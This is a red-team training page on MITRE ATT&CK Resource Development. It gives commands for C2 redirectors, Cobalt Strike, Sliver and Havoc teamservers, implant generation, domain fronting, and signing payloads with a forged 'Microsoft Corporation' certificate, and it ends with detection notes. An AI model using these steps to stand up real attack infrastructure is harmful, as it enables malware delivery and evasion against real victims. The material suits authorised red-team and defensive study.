---
layout: training-page
title: "TA0042 — Resource Development — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - resource-development
  - infrastructure
  - c2
page_key: "mitre-ta0042"
render_with_liquid: false
---

# TA0042 — Resource Development

Resource Development covers all the groundwork an adversary completes before launching an attack: acquiring infrastructure, building or obtaining capabilities, and establishing accounts. Like Reconnaissance, this tactic occurs pre-attack and leaves no footprint on the target. Defenders can sometimes detect it post-incident by identifying infrastructure patterns, code signing certificates, or domains registered shortly before attack activity.

Red teamers simulate this phase by setting up realistic C2 infrastructure, registering aged or categorized domains, and developing or acquiring the payload capabilities they'll use during execution.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1583 | Acquire Infrastructure | T1583.001 Domains | Register lookalike or typosquatting domains |
| T1583 | Acquire Infrastructure | T1583.002 DNS Server | Authoritative DNS for C2 domains |
| T1583 | Acquire Infrastructure | T1583.003 Virtual Private Server | Cloud VPS for redirectors/teamservers |
| T1583 | Acquire Infrastructure | T1583.004 Server | Dedicated bare-metal for heavy C2 |
| T1583 | Acquire Infrastructure | T1583.006 Web Services | Cloud functions, CDN workers for fronting |
| T1583 | Acquire Infrastructure | T1583.008 Malvertising | Ad network abuse for drive-by delivery |
| T1584 | Compromise Infrastructure | T1584.001 Domains | Hijack expired/dropped domains with history |
| T1584 | Compromise Infrastructure | T1584.004 Server | Compromise VPS/hosting via cred stuffing |
| T1584 | Compromise Infrastructure | T1584.006 Web Services | Abuse legit SaaS (GitHub, Dropbox) as C2 |
| T1587 | Develop Capabilities | T1587.001 Malware | Custom implants, loaders, droppers |
| T1587 | Develop Capabilities | T1587.002 Code Signing Certs | Self-signed or purchased EV/OV certs |
| T1587 | Develop Capabilities | T1587.003 Digital Certificates | TLS certs via Let's Encrypt for HTTPS C2 |
| T1587 | Develop Capabilities | T1587.004 Exploits | Custom CVE weaponization |
| T1588 | Obtain Capabilities | T1588.001 Malware | Purchase/download crimeware (Cobalt Strike leaks) |
| T1588 | Obtain Capabilities | T1588.002 Tool | GitHub tools: Sliver, Havoc, Mythic |
| T1588 | Obtain Capabilities | T1588.003 Code Signing Certs | Buy EV cert for payload signing |
| T1588 | Obtain Capabilities | T1588.005 Exploits | Exploit brokers, vulnerability markets |
| T1585 | Establish Accounts | T1585.001 Social Media | Fake LinkedIn/Twitter for pretexting |
| T1585 | Establish Accounts | T1585.002 Email Accounts | Lookalike domains with email configured |
| T1585 | Establish Accounts | T1585.003 Cloud Accounts | AWS/Azure accounts for infrastructure |
| T1586 | Compromise Accounts | T1586.001 Social Media | Hijack legitimate accounts for trust |
| T1586 | Compromise Accounts | T1586.002 Email Accounts | BEC starting point |

## Red Team Tooling

### Domain & Infrastructure Setup

```
# Register domain via Namecheap/Porkbun CLI or manual
# Best practices: register 60+ days before engagement, point to benign content

# Categorize domain before use (use categorization check tools)
curl "https://sitereview.bluecoat.com/api/checkurl" \
  -d '{"url":"https://yourdomain.com"}' -H "Content-Type: application/json"

# Let's Encrypt TLS cert for C2 domain
certbot certonly --standalone -d c2.yourdomain.com --email you@email.com --agree-tos

# Socat redirector — forward traffic from exposed VPS to teamserver
socat TCP4-LISTEN:443,fork TCP4:TEAMSERVER_IP:443

# Nginx as C2 redirector (whitelist only known C2 paths)
# /etc/nginx/sites-available/redirector.conf
server {
    listen 443 ssl;
    server_name c2.yourdomain.com;
    ssl_certificate /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem;
    location /api/v1/update {
        proxy_pass https://TEAMSERVER_IP;
    }
    location / {
        return 301 https://microsoft.com;   # decoy redirect
    }
}
```

### Cobalt Strike / Sliver Teamserver Setup

```
# Cobalt Strike teamserver (requires license)
./teamserver ATTACKER_IP PASSWORD [c2.profile]

# Sliver server (open source)
./sliver-server
# Generate HTTPS implant
sliver > generate --http c2.yourdomain.com --os windows --arch amd64 --name implant
sliver > https --lport 443 --cert /path/to/cert.pem --key /path/to/key.pem

# Havoc C2 teamserver
./havoc server --profile profiles/havoc.yaotl
```

### Domain Fronting & Cloud Infrastructure

```
# Cloudflare Worker as C2 relay (JavaScript)
# Deploy via wrangler — traffic appears to come from Cloudflare IPs
wrangler deploy

# AWS Lambda as C2 callback relay
# Serverless function proxies requests to teamserver — egress looks like AWS

# CDN domain fronting check — verify Host header routing
curl -H "Host: c2.yourdomain.com" https://cdn.cloudflare.net/beacon
```

### Payload Signing

```
# Generate self-signed EV-like cert for payload signing (Windows)
makecert.exe -r -n "CN=Microsoft Corporation" -a sha256 -eku 1.3.6.1.5.5.7.3.3 -sv cert.pvk cert.cer
pvk2pfx.exe -pvk cert.pvk -spc cert.cer -pfx cert.pfx

# Sign PE with signtool (Windows SDK)
signtool.exe sign /fd SHA256 /p12 cert.pfx /p password /t http://timestamp.digicert.com payload.exe
```

## Detection Notes

- **Domain registration timing**: domains registered shortly before attacks, especially with privacy protection and hosting on bulletproof VPS, are indicators. CTI teams track new certificate transparency logs
- **Certificate patterns**: Let's Encrypt certs for newly registered domains associated with known hosting ASNs (Frantech, Psychz, M247) — flagged by TI vendors
- **Infrastructure reuse**: threat actors often reuse ASNs, hosting providers, registrars. Pattern matching across incidents can attribute infrastructure clusters
- **Malware family fingerprinting**: JA3/JA3S TLS fingerprinting identifies C2 frameworks (Cobalt Strike, Sliver) even without decryption
- **Code signing cert abuse**: certs issued to shell companies or using unusual CSPs trigger Windows SmartScreen reputation lookups

## Related Academy Pages

- [C2 Redirectors](/c2-frameworks/redirectors/)
- [Engagement Infrastructure](/c2-frameworks/engagement-infrastructure/)
- [Domain Strategy & Categorization](/infrastructure/domain-categorization/)
- [Phishing Email Infrastructure](/infrastructure/email-infra/)
- [Anonymous Infrastructure](/infrastructure/anonymous-infra/)
- [Teamserver Buildout](/c2-frameworks/teamserver-buildout/)
- [C2 OPSEC](/c2-frameworks/c2-opsec/)

## Resources

- [TA0042 — MITRE ATT&CK Resource Development](https://attack.mitre.org/tactics/TA0042/)
- [T1583 — Acquire Infrastructure](https://attack.mitre.org/techniques/T1583/)
- [T1587 — Develop Capabilities](https://attack.mitre.org/techniques/T1587/)
- [Red Team Development & Operations](https://redteam.guide/docs/definitions)
